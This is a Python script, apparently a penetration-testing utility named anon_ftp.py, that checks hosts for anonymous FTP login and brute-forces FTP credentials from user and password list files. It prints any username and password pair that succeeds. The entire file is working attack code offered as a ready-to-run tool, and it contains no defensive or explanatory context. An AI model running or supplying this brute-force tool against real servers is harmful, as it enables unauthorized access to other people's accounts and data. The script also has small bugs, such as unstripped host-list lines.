#! /usr/bin/python3

import sys, ftplib, getopt, time
from threading import *

def usage():
	print("\n============================================================================================");
	print("Test for anonymus ftp login or brute force login with user and password files");
	print("Usage:");
	print("anon_ftp.py -t IP|Host -f hostlist -u username -l userlist -p passwordlist");
	print("-------------");
	print("-t | --target IP|Host                         ### Host");
	print("-f | --file <file>                   	      ### Host List file");
	print("-u | --user Username	                      ### User");
	print("-l | --list <file>                            ### User file");
	print("-p | --password <file>                        ### Password file");
	print("============================================================================================\n");

def anonLogin(hostname):
	global found;
	global fails;

	try:
		ftp = ftplib.FTP(hostname);
		ftp.login('anonymous', 'anon@thisbox.com');
		print(hostname+": Anon login: Success");
		ftp.quit();
		ftp.close();
		return True;

	except ftplib.all_errors as err:
		print(hostname+": Anon login: Fail, "+str(err));
		return False;

def bruteLogin(hostname, user, password):
	global found;
	global fails;

	try:
		ftp = ftplib.FTP(hostname);
		ftp.login(user, password);
		print("Success: " +user+":"+password);
		ftp.quit();
		ftp.close();
		return True;
	except ftplib.all_errors as err:
		return False;

def main(argv):
	ispass = False;
	ishost = False;
	isusers = False;

	if (len(argv)<1):
		print("Missing Arguments");
		usage();
		sys.exit(2);
	try:
		opts, args = getopt.getopt(argv, 'ht:f:u:l:p:', ["target=", "file=", "user=", "list=", "password="]);
	except getopt.GetoptError as err:
		print(err);
		usage();
		sys.exit(2);

	for opt, arg in opts:
		if opt == '-h':
			usage();
			sys.exit();
		elif opt in ('-t', "--target"):
			target = arg;
		elif opt in ('-f', "--file"):
			infile = arg;
			ishost=True;
		elif opt in ('-u', "--user"):
			user = arg;
		elif opt in ('-l', "--list"):
			ulist = arg;
			isusers = True;
		elif opt in ('-p', "--password"):
			pass_file = arg;
			ispass = True;
		else:
			print("what, how did this happen?");
		
	if ispass:
		passfile = open(pass_file, 'r');
		for passwd in passfile:
			passwd = passwd.strip('\r').strip('\n');
			if isusers:
				users = open(ulist, 'r');
				for user in users:
					user = user.strip('\r').strip('\n');
					print("Trying: "+user+":"+passwd); 
					bruteLogin(target, user, passwd);
			else:
				print("Trying: "+user+":"+passwd);
				bruteLogin(target, user, passwd);
	elif ishost:
		hosts = open(infile);
		for host in hosts:
			anonLogin(host);
		
	else:
		anonLogin(target);

if __name__ == "__main__":
	main(sys.argv[1:])


